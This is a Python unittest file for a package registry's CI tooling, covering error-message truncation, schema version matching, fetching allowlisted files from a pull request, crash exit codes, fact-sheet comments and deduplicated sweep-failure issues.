class GenerationErrorTests(unittest.TestCase):
    def test_the_first_line_survives_truncation(self) -> None:
        message = "Error: --providerName doesn't match the schema name\n" + "stack\n" * 500

        class Failed:
            returncode = 1
            stdout = ""
            stderr = message

        with patch.object(subprocess, "run", lambda *a, **k: Failed()):
            generated, output = resourcedocsgen.generate_metadata("o/r", "schema.json", "v1", "r")
        self.assertFalse(generated)
        self.assertIn("--providerName doesn't match the schema name", output)


class SchemaVersionTests(unittest.TestCase):
    def test_a_v_prefixed_schema_version_matches_a_v_prefixed_tag(self) -> None:
        self.assertTrue(verify_entry._schema_version_matches("v0.1.0", "v0.1.0"))

    def test_a_bare_schema_version_still_matches(self) -> None:
        self.assertTrue(verify_entry._schema_version_matches("0.1.0", "v0.1.0"))

    def test_a_different_version_still_fails(self) -> None:
        self.assertFalse(verify_entry._schema_version_matches("v0.2.0", "v0.1.0"))


class FetchPrTests(unittest.TestCase):
    def test_every_allowlisted_file_arrives_at_the_pr_head(self) -> None:
        contents = {str(package_list.PATH): '{"include":[]}',
                    str(package_list.PUBLISHER_NAMES_PATH): '{"Incremental Steps": "incsteps"}'}
        with tempfile.TemporaryDirectory() as scratch:
            root = Path(scratch)
            for path in package_list.ALLOWED_PATHS:
                (root / path).parent.mkdir(parents=True, exist_ok=True)
            cwd = os.getcwd()
            os.chdir(root)
            try:
                with patch.object(github_api, "pull_request",
                                  lambda pr: {"head": {"sha": "c" * 40}}), \
                     patch.object(github_api, "repo", lambda: "x/y"), \
                     patch.object(github_api, "file_content_at",
                                  lambda slug, path, ref: contents[path]), \
                     patch.object(github_api, "pull_request_files",
                                  lambda pr: [str(p) for p in package_list.ALLOWED_PATHS]):
                    cli.run_fetch_pr(argparse.Namespace(pr=7, changed_files="changed.txt", out="."))
                for name, body in contents.items():
                    self.assertEqual(Path(name).read_text(), body)
            finally:
                os.chdir(cwd)


class CheckCrashTests(unittest.TestCase):
    def test_a_broken_check_is_not_a_verdict(self) -> None:
        with tempfile.TemporaryDirectory() as scratch:
            args = argparse.Namespace(diff="origin/master", changed_files=None, out=scratch)
            with patch.object(cli, "_check", side_effect=RuntimeError("the network went away")):
                self.assertEqual(cli.run_check(args), 2)
            sheet = (Path(scratch) / "000.factsheet.md").read_text()
        self.assertIn("could not run", sheet)
        self.assertIn("the network went away", sheet)

    def test_a_red_package_keeps_its_own_exit_code(self) -> None:
        with tempfile.TemporaryDirectory() as scratch:
            args = argparse.Namespace(diff="origin/master", changed_files=None, out=scratch)
            with patch.object(cli, "_check", lambda a: 1):
                self.assertEqual(cli.run_check(args), 1)


class ReportTests(unittest.TestCase):
    def _report(self, sheets: dict[str, str], existing: dict[str, Any] | None = None) -> str:
        written: list[str] = []
        with tempfile.TemporaryDirectory() as scratch:
            root = Path(scratch)
            for name, body in sheets.items():
                (root / name).write_text(body)
            cwd = os.getcwd()
            os.chdir(root)
            try:
                os.environ.update(PR="7", GITHUB_RUN_ID="42", GITHUB_REPOSITORY="x/y")
                with patch.object(github_api, "fact_sheet_comment", lambda pr: existing), \
                     patch.object(github_api, "post_comment", lambda pr, body: written.append(body)), \
                     patch.object(github_api, "edit_comment", lambda cid, body: written.append(body)):
                    comment_commands.report()
            finally:
                os.chdir(cwd)
        return written[0]

    def test_a_written_sheet_is_posted(self) -> None:
        self.assertIn("## ✅ ready", self._report({"000.factsheet.md": "## ✅ ready"}))

    def test_no_sheet_replaces_the_comment_with_a_failure_notice(self) -> None:
        body = self._report({}, existing={"id": 1, "body": "old fact-sheet"})
        self.assertIn("did not finish", body)
        self.assertIn("/actions/runs/42", body)


class SweepFailureIssueTests(unittest.TestCase):
    def _alert(self, listed: list[dict[str, Any]]) -> list[dict[str, Any]]:
        created: list[dict[str, Any]] = []
        os.environ.update(REPO="x/y", GITHUB_RUN_ID="42", GITHUB_REPOSITORY="x/y")
        with patch.object(github_api, "request", lambda p, *a, **k: listed), \
             patch.object(github_api, "create_issue",
                          lambda title, body, labels: created.append(
                              {"title": title, "body": body, "labels": labels})):
            comment_commands.sweep_failed()
        return created

    def _issue(self, body: str) -> dict[str, Any]:
        return {"number": 5, "body": body}

    def test_the_first_failure_opens_one_issue(self) -> None:
        created = self._alert([])
        self.assertEqual(len(created), 1)
        self.assertEqual(created[0]["labels"], [comment_commands.SWEEP_FAILURE_LABEL])
        self.assertIn(comment_commands.SWEEP_FAILURE_MARKER, created[0]["body"])
        self.assertIn("/actions/runs/42", created[0]["body"])

    def test_every_later_failure_opens_nothing(self) -> None:
        marked = self._issue(comment_commands.SWEEP_FAILURE_MARKER + "\nstill broken")
        self.assertEqual(self._alert([marked]), [])

    def test_an_unrelated_p1_issue_does_not_suppress_the_alert(self) -> None:
        self.assertEqual(len(self._alert([self._issue("some other p1 problem")])), 1)

    def test_a_pull_request_is_never_mistaken_for_the_issue(self) -> None:
        pr = {"number": 6, "body": comment_commands.SWEEP_FAILURE_MARKER, "pull_request": {}}
        self.assertEqual(len(self._alert([pr])), 1)
